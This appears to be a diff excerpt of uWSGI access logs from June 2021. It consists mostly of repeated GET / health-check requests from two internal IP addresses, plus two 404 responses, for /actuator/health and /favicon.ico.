+[pid: 3104|app: 0|req: 227/293] 10.0.1.67 () {34 vars in 394 bytes} [Sat Jun  5 20:36:53 2021] GET / => generated 10457 bytes in 86 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3104|app: 0|req: 228/294] 10.0.0.90 () {34 vars in 394 bytes} [Sat Jun  5 20:37:03 2021] GET / => generated 10457 bytes in 158 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3104|app: 0|req: 229/295] 10.0.1.67 () {34 vars in 394 bytes} [Sat Jun  5 20:37:23 2021] GET / => generated 10457 bytes in 75 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3104|app: 0|req: 230/296] 10.0.0.90 () {34 vars in 394 bytes} [Sat Jun  5 20:37:33 2021] GET / => generated 10457 bytes in 83 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3104|app: 0|req: 231/297] 10.0.1.67 () {34 vars in 394 bytes} [Sat Jun  5 20:37:53 2021] GET / => generated 10457 bytes in 77 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3104|app: 0|req: 232/298] 10.0.0.90 () {34 vars in 394 bytes} [Sat Jun  5 20:38:03 2021] GET / => generated 10457 bytes in 80 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3104|app: 0|req: 233/299] 10.0.1.67 () {34 vars in 394 bytes} [Sat Jun  5 20:38:23 2021] GET / => generated 10457 bytes in 80 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3103|app: 0|req: 40/300] 10.0.1.67 () {42 vars in 569 bytes} [Sat Jun  5 20:38:28 2021] GET /actuator/health => generated 179 bytes in 81 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
+[pid: 3104|app: 0|req: 234/301] 10.0.0.90 () {34 vars in 394 bytes} [Sat Jun  5 20:38:33 2021] GET / => generated 10457 bytes in 93 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3104|app: 0|req: 235/302] 10.0.1.67 () {34 vars in 394 bytes} [Sat Jun  5 20:38:53 2021] GET / => generated 10457 bytes in 89 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3104|app: 0|req: 236/303] 10.0.0.90 () {34 vars in 394 bytes} [Sat Jun  5 20:39:03 2021] GET / => generated 10457 bytes in 84 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3104|app: 0|req: 237/304] 10.0.1.67 () {34 vars in 394 bytes} [Sat Jun  5 20:39:23 2021] GET / => generated 10457 bytes in 80 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3104|app: 0|req: 238/305] 10.0.0.90 () {34 vars in 394 bytes} [Sat Jun  5 20:39:33 2021] GET / => generated 10457 bytes in 74 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3104|app: 0|req: 239/306] 10.0.1.67 () {34 vars in 394 bytes} [Sat Jun  5 20:39:53 2021] GET / => generated 10457 bytes in 74 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3104|app: 0|req: 240/307] 10.0.0.90 () {34 vars in 394 bytes} [Sat Jun  5 20:40:03 2021] GET / => generated 10457 bytes in 78 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3104|app: 0|req: 241/308] 10.0.1.67 () {34 vars in 394 bytes} [Sat Jun  5 20:40:23 2021] GET / => generated 10457 bytes in 72 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3104|app: 0|req: 242/309] 10.0.0.90 () {34 vars in 394 bytes} [Sat Jun  5 20:40:33 2021] GET / => generated 10457 bytes in 103 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3104|app: 0|req: 243/310] 10.0.1.67 () {34 vars in 394 bytes} [Sat Jun  5 20:40:53 2021] GET / => generated 10457 bytes in 77 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3104|app: 0|req: 244/311] 10.0.0.90 () {34 vars in 394 bytes} [Sat Jun  5 20:41:03 2021] GET / => generated 10457 bytes in 79 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3104|app: 0|req: 245/312] 10.0.1.67 () {34 vars in 394 bytes} [Sat Jun  5 20:41:23 2021] GET / => generated 10457 bytes in 110 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3104|app: 0|req: 246/313] 10.0.0.90 () {34 vars in 394 bytes} [Sat Jun  5 20:41:33 2021] GET / => generated 10457 bytes in 75 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3104|app: 0|req: 247/314] 10.0.1.67 () {34 vars in 394 bytes} [Sat Jun  5 20:41:53 2021] GET / => generated 10457 bytes in 84 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3104|app: 0|req: 248/315] 10.0.0.90 () {34 vars in 394 bytes} [Sat Jun  5 20:42:03 2021] GET / => generated 10457 bytes in 117 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3104|app: 0|req: 249/316] 10.0.1.67 () {34 vars in 394 bytes} [Sat Jun  5 20:42:23 2021] GET / => generated 10457 bytes in 72 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3104|app: 0|req: 250/317] 10.0.0.90 () {34 vars in 394 bytes} [Sat Jun  5 20:42:33 2021] GET / => generated 10457 bytes in 86 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3104|app: 0|req: 251/318] 10.0.1.67 () {34 vars in 394 bytes} [Sat Jun  5 20:42:53 2021] GET / => generated 10457 bytes in 79 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3104|app: 0|req: 252/319] 10.0.0.90 () {34 vars in 394 bytes} [Sat Jun  5 20:43:03 2021] GET / => generated 10457 bytes in 78 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3104|app: 0|req: 253/320] 10.0.1.67 () {34 vars in 394 bytes} [Sat Jun  5 20:43:23 2021] GET / => generated 10457 bytes in 118 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3104|app: 0|req: 254/321] 10.0.0.90 () {34 vars in 394 bytes} [Sat Jun  5 20:43:33 2021] GET / => generated 10457 bytes in 102 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3104|app: 0|req: 255/322] 10.0.1.67 () {34 vars in 394 bytes} [Sat Jun  5 20:43:53 2021] GET / => generated 10457 bytes in 101 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3104|app: 0|req: 256/323] 10.0.0.90 () {34 vars in 394 bytes} [Sat Jun  5 20:44:03 2021] GET / => generated 10457 bytes in 102 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3104|app: 0|req: 257/324] 10.0.1.67 () {34 vars in 394 bytes} [Sat Jun  5 20:44:23 2021] GET / => generated 10457 bytes in 107 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3104|app: 0|req: 258/325] 10.0.0.90 () {34 vars in 394 bytes} [Sat Jun  5 20:44:33 2021] GET / => generated 10457 bytes in 75 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3104|app: 0|req: 259/326] 10.0.0.90 () {44 vars in 730 bytes} [Sat Jun  5 20:44:37 2021] GET / => generated 10457 bytes in 75 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3103|app: 0|req: 41/327] 10.0.1.67 () {44 vars in 752 bytes} [Sat Jun  5 20:44:37 2021] GET /favicon.ico => generated 179 bytes in 89 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
+[pid: 3104|app: 0|req: 260/328] 10.0.1.67 () {34 vars in 394 bytes} [Sat Jun  5 20:44:53 2021] GET / => generated 10457 bytes in 91 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3104|app: 0|req: 261/329] 10.0.0.90 () {34 vars in 394 bytes} [Sat Jun  5 20:45:03 2021] GET / => generated 10457 bytes in 103 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3104|app: 0|req: 262/330] 10.0.1.67 () {34 vars in 394 bytes} [Sat Jun  5 20:45:23 2021] GET / => generated 10457 bytes in 99 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3104|app: 0|req: 263/331] 10.0.0.90 () {34 vars in 394 bytes} [Sat Jun  5 20:45:33 2021] GET / => generated 10457 bytes in 75 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3104|app: 0|req: 264/332] 10.0.1.67 () {34 vars in 394 bytes} [Sat Jun  5 20:45:53 2021] GET / => generated 10457 bytes in 83 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3104|app: 0|req: 265/333] 10.0.0.90 () {34 vars in 394 bytes} [Sat Jun  5 20:46:03 2021] GET / => generated 10457 bytes in 84 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3104|app: 0|req: 266/334] 10.0.1.67 () {34 vars in 394 bytes} [Sat Jun  5 20:46:23 2021] GET / => generated 10457 bytes in 74 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3104|app: 0|req: 267/335] 10.0.0.90 () {34 vars in 394 bytes} [Sat Jun  5 20:46:33 2021] GET / => generated 10457 bytes in 104 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3104|app: 0|req: 268/336] 10.0.1.67 () {34 vars in 394 bytes} [Sat Jun  5 20:46:53 2021] GET / => generated 10457 bytes in 73 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3104|app: 0|req: 269/337] 10.0.0.90 () {34 vars in 394 bytes} [Sat Jun  5 20:47:03 2021] GET / => generated 10457 bytes in 74 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3104|app: 0|req: 270/338] 10.0.1.67 () {34 vars in 394 bytes} [Sat Jun  5 20:47:24 2021] GET / => generated 10457 bytes in 82 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3104|app: 0|req: 271/339] 10.0.0.90 () {34 vars in 394 bytes} [Sat Jun  5 20:47:34 2021] GET / => generated 10457 bytes in 84 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3104|app: 0|req: 272/340] 10.0.1.67 () {34 vars in 394 bytes} [Sat Jun  5 20:47:54 2021] GET / => generated 10457 bytes in 79 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3104|app: 0|req: 273/341] 10.0.0.90 () {34 vars in 394 bytes} [Sat Jun  5 20:48:04 2021] GET / => generated 10457 bytes in 75 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3104|app: 0|req: 274/342] 10.0.1.67 () {34 vars in 394 bytes} [Sat Jun  5 20:48:24 2021] GET / => generated 10457 bytes in 152 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3104|app: 0|req: 275/343] 10.0.0.90 () {34 vars in 394 bytes} [Sat Jun  5 20:48:34 2021] GET / => generated 10457 bytes in 75 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3104|app: 0|req: 276/344] 10.0.1.67 () {34 vars in 394 bytes} [Sat Jun  5 20:48:54 2021] GET / => generated 10457 bytes in 77 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3104|app: 0|req: 277/345] 10.0.0.90 () {34 vars in 394 bytes} [Sat Jun  5 20:49:04 2021] GET / => generated 10457 bytes in 101 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3104|app: 0|req: 278/346] 10.0.1.67 () {34 vars in 394 bytes} [Sat Jun  5 20:49:24 2021] GET / => generated 10457 bytes in 128 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3104|app: 0|req: 279/347] 10.0.0.90 () {34 vars in 394 bytes} [Sat Jun  5 20:49:34 2021] GET / => generated 10457 bytes in 84 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3104|app: 0|req: 280/348] 10.0.1.67 () {34 vars in 394 bytes} [Sat Jun  5 20:49:54 2021] GET / => generated 10457 bytes in 85 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3104|app: 0|req: 281/349] 10.0.0.90 () {34 vars in 394 bytes} [Sat Jun  5 20:50:04 2021] GET / => generated 10457 bytes in 74 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3104|app: 0|req: 282/350] 10.0.1.67 () {34 vars in 394 bytes} [Sat Jun  5 20:50:24 2021] GET / => generated 10457 bytes in 166 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3104|app: 0|req: 283/351] 10.0.0.90 () {34 vars in 394 bytes} [Sat Jun  5 20:50:34 2021] GET / => generated 10457 bytes in 92 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3104|app: 0|req: 284/352] 10.0.1.67 () {34 vars in 394 bytes} [Sat Jun  5 20:50:54 2021] GET / => generated 10457 bytes in 79 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3104|app: 0|req: 285/353] 10.0.0.90 () {34 vars in 394 bytes} [Sat Jun  5 20:51:04 2021] GET / => generated 10457 bytes in 94 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3104|app: 0|req: 286/354] 10.0.1.67 () {34 vars in 394 bytes} [Sat Jun  5 20:51:24 2021] GET / => generated 10457 bytes in 157 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3104|app: 0|req: 287/355] 10.0.0.90 () {34 vars in 394 bytes} [Sat Jun  5 20:51:34 2021] GET / => generated 10457 bytes in 92 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3104|app: 0|req: 288/356] 10.0.1.67 () {34 vars in 394 bytes} [Sat Jun  5 20:51:54 2021] GET / => generated 10457 bytes in 86 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3104|app: 0|req: 289/357] 10.0.0.90 () {34 vars in 394 bytes} [Sat Jun  5 20:52:04 2021] GET / => generated 10457 bytes in 110 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3104|app: 0|req: 290/358] 10.0.1.67 () {34 vars in 394 bytes} [Sat Jun  5 20:52:24 2021] GET / => generated 10457 bytes in 76 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
